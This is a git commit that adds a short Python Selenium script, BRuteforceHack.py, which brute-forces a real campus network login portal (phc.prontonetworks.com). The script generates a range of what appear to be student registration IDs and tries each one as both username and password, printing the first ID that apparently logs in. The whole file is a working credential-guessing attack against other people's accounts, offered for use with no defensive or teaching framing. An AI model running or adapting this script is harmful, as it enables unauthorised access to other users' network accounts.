948c1800cdf3776eb4765b5cb50a9c7b067b456d
Subhaditya Mukherjee <msubhaditya@gmail.com>
2017-12-12 15:33:41 +0530

    Add files via upload

---
+++ VOLSBB_Brute/BRuteforceHack.py
@@ -0,0 +1,20 @@
+from selenium import webdriver
+
+d = []
+for a in range(3000,1443,-1):
+	d.append('15BCE'+str(a))
+
+browser = webdriver.Firefox()
+browser.get('http://phc.prontonetworks.com/cgi-bin/authlogout?URI=http://phc.prontonetworks.com/')
+browser.get('http://phc.prontonetworks.com/cgi-bin/authlogin?URI=http://www.msftconnecttest.com/redirect')
+for a in d:
+	try:
+		userid = browser.find_element_by_name("userId")
+		userid.send_keys(a)
+		password = browser.find_element_by_name("password")
+		password.send_keys(a)
+		submit = browser.find_element_by_name("Submit22")
+		submit.click()
+	except:
+		print(a)
+		break
